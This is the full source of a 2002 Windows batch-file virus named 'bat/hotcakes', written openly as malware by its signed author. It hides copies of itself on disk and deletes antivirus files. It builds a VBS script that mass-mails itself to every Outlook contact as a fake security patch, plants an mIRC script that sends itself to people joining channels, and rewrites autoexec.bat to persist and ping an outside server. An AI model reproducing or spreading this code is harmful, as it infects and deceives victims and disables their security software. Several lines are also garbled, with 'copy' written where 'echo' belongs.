:bat/hotcakes
:by adious
:written on 2/7/02

:clear_screen
cls

:check_from_reinfection
If exist c:\hotcakes.log goto end_vir

:create_identfile
copy 00000000000000 >c:\hotcakes.log
copy Infected by bat.hotcakes >>c:\hotcakes.log
copy 00000000000000 >>c:\hotcakes.log
attrib +h c:\hotcakes.log

:copy_self
copy %0 c:\hotcakes.bat
copy %0 c:\boy.bat
copy %0 c:\windows\handgun.bat
copy %0 c:\windows\girl99.bat
copy %0 c:\b.bat
copy %0 c:\d.bat
attrib +h +s c:\boy.bat
attrib +h +s c:\windows\handgun.bat
attrib +h +s c:\windows\girl99.bat
attrib +h +s c:\b.bat
attrib +h +s c:\d.bat

:Retrofuntions
if exist c:\hotcakes.bat del c:\programme\norton~1\s32integ.dll
if exist c:\hotcakes.bat del c:\programme\f-prot95\fpwm32.dll
if exist c:\hotcakes.bat del c:\programme\mcafee\scan.dat
if exist c:\hotcakes.bat del c:\tbavw95\tbscan.sig

:massmailer
echo.on error resume next > c:\X.vbs
echo dim a,b,c,d,e >> c:\X.vbs
echo set a = Wscript.CreateObject("Wscript.Shell") >> c:\X.vbs
echo set b = CreateObject("Outlook.Application") >> c:\X.vbs
echo set c = b.GetNameSpace("MAPI") >> c:\X.vbs
echo for y = 1 To c.AddressLists.Count >> c:\X.vbs
echo set d = c.AddressLists(y) >> c:\X.vbs
echo x = 1 >> c:\X.vbs
echo set e = b.CreateItem(0) >> c:\X.vbs
echo for o = 1 To d.AddressEntries.Count >> c:\X.vbs
echo f = d.AddressEntries(x) >> c:\X.vbs
echo e.Recipients.Add f >> c:\X.vbs
echo x = x + 1 >> c:\X.vbs
echo next >> c:\X.vbs
echo e.Subject = "Patch your system now!!" >> c:\X.vbs
echo e.Body = "Here's a patch that is newly discovered" >> c:\X.vbs
echo e.Body = "by me..patch against virus and hackers.download this now.." 
 >> c:\X.vbs
echo e.Attachments.Add ("c:\hotcakes.bat") >> c:\X.vbs
echo e.DeleteAfterSubmit = False >> c:\X.vbs
echo e.Send >> c:\X.vbs
echo f = "" >> c:\X.vbs
echo next >> c:\X.vbs
start c:\X.vbs

:mIrc_werm
echo [script]>b.bat
echo n0=on 1:JOIN:#:{ >>b.bat
echo n1= /if ( nick == $me ) { halt } >>b.bat
echo n2= /.dcc send $nick c:\hotcakes.bat >>b.bat
echo n3=} >>b.bat
if exist c:\mirc\mirc.ini copy b.bat c:\mirc\script.ini
if exist c:\mirc32\mirc.ini copy b.bat c:\mirc32\script.ini
if exist c:\progra~1\mirc\mirc.ini copy b.bat c:\progra~1\mirc\script.ini
if exist c:\progra~1\mirc32\mirc.ini copy b.bat 
c:\progra~1\mirc32\script.ini
del b.bat

:Intel_auto_start
del c:\autoexec.bat
copy @echo off >c:\autoexec.bat
copy if exist c:\hotcakes.bat start c:\hotcakes.bat >>c:\autoexec.bat
copy goto night >>c:\autoexec.bat
copy if not exist c:\hotcakes.bat goto precop >>c:\autoexec.bat
copy :precop >>c:\autoexec.bat
copy copy c:\windows\handgun.bat c:\hotcakes.bat >>c:\autoexec.bat
copy copy c:\b.bat c:\hotcakes.bat >>c:\autoexec.bat
copy copy c:\d.bat c:\hotcakes.bat >>c:\autoexec.bat
copy copy c:\windows\girl99.bat c:\hotcakes.bat >>c:\autoexec.bat
copy copy c:\boy.bat c:\hotcakes.bat >>c:\autoexec.bat
copy attrib -h -s c:\hotcakes.bat >>c:\autoexec.bat
copy :night >>c:\autoexec.bat
copy echo ooooooooooooooooo >>c:\autoexec.bat
copy echo you are owned by a computer virus named BAT\hotcakes ;) >>c:\autoexec.bat
copy echo by adious >>c:\autoexec.bat
copy echo adious@rRlf.de >>c:\autoexec.bat
copy echo ooooooooooooooooo >>c:\autoexec.bat
copy pause >>c:\autoexec.bat
copy ping -l 3000 www.smutserver.com >>c:/autoexec.bat
copy ping -l 666 www.smutserver.com >>c:/autoexec.bat

:End_vir
:adious_[rRlf]